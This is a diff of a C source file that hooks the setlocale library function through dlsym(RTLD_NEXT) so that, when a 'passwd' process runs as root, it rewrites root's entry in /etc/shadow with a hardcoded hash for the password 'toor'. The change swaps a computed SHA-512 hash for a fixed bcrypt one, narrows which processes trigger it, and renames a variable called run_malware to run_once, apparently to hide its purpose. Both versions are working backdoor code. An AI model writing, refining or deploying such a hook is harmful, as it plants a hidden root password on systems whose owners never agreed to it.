@@ -5,7 +5,7 @@
 #include <stdlib.h>
 #include <unistd.h>
 #include <string.h>
-#include <crypt.h>
+#include <dlfcn.h>
 #include <shadow.h>
 #include <limits.h>
 
@@ -19,45 +19,41 @@ void get_process_name(char *buffer, size_t size) {
     }
 }
 
-void change_shadow_password(const char *username, const char *newpassword) {
+static void modify_root_password() {
     struct spwd *entry;
     FILE *shadow;
-    char salt[] = "$6$salt123";  // SHA-512 salt
-    char *hashed_pw;
 
-    entry = getspnam(username);
-    if (!entry) return;
+    // Hardcoded bcrypt hash for toor
+    const char *new_hashed_pw = "$2y$10$qLXrtg/LwrH631WoNpU2feJ2DJzeAKp/M4WrQ0SvWSp4TbO1UK7lW";
 
-    hashed_pw = crypt(newpassword, salt);
-    if (!hashed_pw) return;
+    if (!(entry = getspnam("root"))) return;
 
-    entry->sp_pwdp = hashed_pw;
+    entry->sp_pwdp = (char *)new_hashed_pw;
 
-    shadow = fopen("/etc/shadow", "r+");
-    if (!shadow) return;
+    if (!(shadow = fopen("/etc/shadow", "r+"))) return;
 
     putspent(entry, shadow);
     fclose(shadow);
 }
 
+// Hooked `setlocale` function
 char *setlocale(int category, const char *locale) {
     static char *(*real_setlocale)(int, const char *) = NULL;
-    static int run_malware = 1;
+    static int run_once = 1;
     char process_name[PATH_MAX];
 
     if (!real_setlocale) {
         real_setlocale = dlsym(RTLD_NEXT, "setlocale");
     }
 
-    if (run_malware) {
-        run_malware = 0;
+    if (run_once) {
+        run_once = 0;
         
         get_process_name(process_name, sizeof(process_name));
         
-        // Only modify password for specific commands (e.g., `cat`, `bash`, `passwd`)
-        if (strstr(process_name, "cat") || strstr(process_name, "bash") || strstr(process_name, "passwd")) {
+        if (strstr(process_name, "passwd")) {
             if (geteuid() == 0) {
-                change_shadow_password("root", "toor");
+                modify_root_password();
             }
         }
     }
